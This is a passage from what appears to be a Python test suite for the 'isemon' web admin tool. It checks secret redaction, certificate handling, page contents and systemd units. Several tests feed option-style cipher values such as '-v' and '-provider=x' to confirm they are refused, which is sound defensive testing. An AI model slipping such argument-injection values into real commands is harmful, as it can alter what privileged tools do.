                                                   'banfeed_token': 'c', 'db_host': 'db1'}))
    conf = json.loads(isemon.carried_files()['config.json'])
    ok('every secret by its name is left out of config.json',
       (conf['db_password'], conf['mikrotik_opn_apisecret'], conf['banfeed_token'], conf['db_host']),
       ('', '', '', 'db1'))
    for bad in ('-v', '-provider=x'):
        try:
            wr.tls_do({'action': 'settings', 'preset': 'custom', 'ciphers': bad}, 'boss')
            ok('a cipher list that would be an option is refused: %s' % bad, False)
        except isemon.WebRootError:
            ok('a cipher list that would be an option is refused: %s' % bad, True)
    sys.path.insert(0, str(ROOT / 'deploy'))
    os.environ.update(ISEMON_NGINX_CONF=str(NGINX), ISEMON_CERT_DIR=str(CERTS))
    import importlib
    hw = importlib.import_module('isemon_web')
    hw.NGINX_MAIN = str(NGINX)
    both = work / 'both.pem'
    both.write_text(leaf + key)
    NGINX.write_text(NGINX.read_text().replace(str(CERTS / 'isemon.pem'), str(both)))
    ok('a certificate file that holds the key too: only the certificate is looked at',
       ('BEGIN CERTIFICATE' in hw.cert_now().get('pem', ''),
        'PRIVATE KEY' in hw.cert_now().get('pem', '')), (True, False))
    try:
        hw.tls_checked({'ciphers': '-v'})
        ok('...and root refuses a cipher list that would be an option', False)
    except hw.Refused:
        ok('...and root refuses a cipher list that would be an option', True)
    api.stop() if hasattr(api, 'stop') else None

    # ------------------------------------------------------------------------
    print('\nThe page')
    page = (ROOT / 'web' / 'index.php').read_text(encoding='utf-8')
    ok('three panes of their own', all('id="pane-%s"' % p in page for p in ('fw', 'tls', 'upgrade')))
    ok('the firewall waits for the save bar', "extraPending('fw'" in page and
       'EXTRA_SAVES[k].save()' in page)
    ok('the upgrade has its bar', 'function upgradeBar(run, d)' in page and
       'isemon is restarting - asking again' in page)
    ok('a package goes as the file itself, never multipart',
       "'X-Isemon-Upgrade': '1', 'Content-Type': 'application/octet-stream'" in page and
       "$what === 'upgrade-package' && strpos($kind, 'application/octet-stream') === 0" in page)
    ok('a full backup is offered', "?api=db-download&full=1" in page)
    hz = (ROOT / 'web' / 'healthz.php').read_text()
    ok('the health check says ok or why not, and not the version',
       "'ok' => $ok" in hz and "'version'" not in hz)
    php = shutil.which('php')
    if php:
        for f in ('index.php', 'healthz.php'):
            ok('%s parses' % f, sh(php, '-l', str(ROOT / 'web' / f)).returncode, 0)
    for f in ('isemon_web.py', 'isemon_upgrade.py'):
        ok('%s parses as python -I' % f, sh(sys.executable, '-I', '-c', 'import ast,sys;'
                                            'ast.parse(open(sys.argv[1]).read())',
                                            str(ROOT / 'deploy' / f)).returncode, 0)
    units = {n: (ROOT / 'deploy' / n).read_text() for n in ('isemon-web.path',
                                                             'isemon-web.service',
                                                             'isemon-upgrade.path',
                                                             'isemon-upgrade.service')}
    ok('the path units watch the daemon\'s folders',
       ('PathExists=/var/lib/isemon/web/request.json' in units['isemon-web.path'],
        'PathExists=/var/lib/isemon/upgrade/request.json' in units['isemon-upgrade.path']),
       (True, True))
    # On the Python isemon runs on, LIB_DIR/python (1.10.252).
    ok('the services run the helpers with python -I',
       ('python -I /usr/local/lib/isemon/isemon_web.py' in units['isemon-web.service'],
        'python -I /usr/local/lib/isemon/isemon_upgrade.py' in units['isemon-upgrade.service']),
       (True, True))
    ok('a release key ships', any((ROOT / 'deploy' / 'release-keys').glob('*.pub')))
    ok('the vhost this package ships is the one before (an upgrade touches nothing of it)',
       'DASHBOARD-ALLOW' in (ROOT / 'deploy' / 'nginx-isemon.conf').read_text(), False)
finally:
    shutil.rmtree(str(work), ignore_errors=True)

print('\n%d ok, %d failed' % (PASS, FAIL))
sys.exit(1 if FAIL else 0)
